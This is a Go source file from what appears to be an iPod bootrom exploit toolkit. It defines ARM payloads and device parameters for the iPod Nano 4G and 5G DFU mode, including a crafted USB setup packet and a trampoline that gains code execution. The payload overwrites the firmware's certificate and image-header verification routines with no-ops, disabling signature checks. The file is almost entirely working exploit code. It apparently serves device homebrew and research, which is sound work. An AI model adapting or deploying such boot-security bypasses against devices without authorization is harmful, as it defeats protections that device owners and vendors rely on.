package exploit

import (
	"github.com/freemyipod/wInd3x/pkg/uasm"
)

func haxedDFUN45G(ret1Addr uint32) []uasm.Statement {

	descriptorSRAM := 0x2202d800
	vtableSRAM := 0x2202d880

	return []uasm.Statement{
		// Copy descriptor to scratch memory space.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(descriptorSRAM)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.LabelRef("descriptor")},
		uasm.Ldrb{Dest: uasm.R2, Src: uasm.Deref(uasm.R1, 0)},

		uasm.Label("descriptor_copy_loop"),
		uasm.Ldrb{Dest: uasm.R3, Src: uasm.Deref(uasm.R1, 0)},
		uasm.Strb{Src: uasm.R3, Dest: uasm.Deref(uasm.R0, 0)},
		uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(1)},
		uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.Immediate(1)},
		uasm.Sub{Dest: uasm.R2, Src: uasm.R2, Compl: uasm.Immediate(1)},
		uasm.Cmp{A: uasm.R2, B: uasm.Immediate(0)},
		uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("descriptor_copy_loop")},

		//// Set descriptor in g_State->dfu_state->deviceDescriptor
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2202fff8)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 1584)},
		uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(descriptorSRAM)},
		uasm.Str{Src: uasm.R2, Dest: uasm.Deref(uasm.R0, 24)},

		// Copy state vtable to scratch.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2202fff8)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 36)},
		uasm.Mov{Dest: uasm.R1, Src: uasm.Immediate(0)},
		uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(vtableSRAM)},

		uasm.Label("vtable_copy_loop"),
		uasm.Ldr{Dest: uasm.R3, Src: uasm.Deref(uasm.R0, 0)},
		uasm.Str{Src: uasm.R3, Dest: uasm.Deref(uasm.R2, 0)},
		uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.Immediate(1)},
		uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(1)},
		uasm.Add{Dest: uasm.R2, Src: uasm.R2, Compl: uasm.Immediate(1)},
		uasm.Cmp{A: uasm.R1, B: uasm.Immediate(84)},
		uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("vtable_copy_loop")},

		// Set new VTable in g_State.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2202fff8)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(vtableSRAM)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 36)},

		// Overwrite VTable verify_{certificate,image_header} to no-ops.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(vtableSRAM)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(ret1Addr)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 28)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 20)},
	}
}

var epNano4G = &Parameters{
	DFUBufAddr: 0x2202db00,
	ExecAddr:   0x2202dc08,
	USBBufAddr: 0x2202e300,

	TrampolineAddr: 0x3b0,
	// b 0x2202dc08
	SetupPacket: []byte{0x40, 0xfe, 0xff, 0xea, 0x03, 0x00, 0x00, 0x00},

	HandlerFooter: []uasm.Statement{
		// Fixup LR (after trampoline blx messes it up)
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x20004d64)},
		uasm.Bx{Dest: uasm.LR},
	},
	AESCall:         makeCall(0x200020d4, 0x2202db00, 0x2202db00, 0x40, 1, 0, 0),
	HaxedDFUPayload: haxedDFUN45G(0x20000d10),
}

var epNano5G = &Parameters{
	DFUBufAddr: 0x2202db00,
	ExecAddr:   0x2202dc08,
	USBBufAddr: 0x2202e300,

	TrampolineAddr: 0x37c,
	// b 0x2202dc08
	SetupPacket: []byte{0x40, 0xfe, 0xff, 0xea, 0x03, 0x00, 0x00, 0x00},

	HandlerFooter: []uasm.Statement{
		// Fixup LR (after trampoline blx messes it up)
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x20004d70)},
		uasm.Bx{Dest: uasm.LR},
	},
	AESCall:         makeCall(0x200020ec, 0x2202db00, 0x2202db00, 0x40, 1, 0, 0),
	HaxedDFUPayload: haxedDFUN45G(0x20000cbc),
}
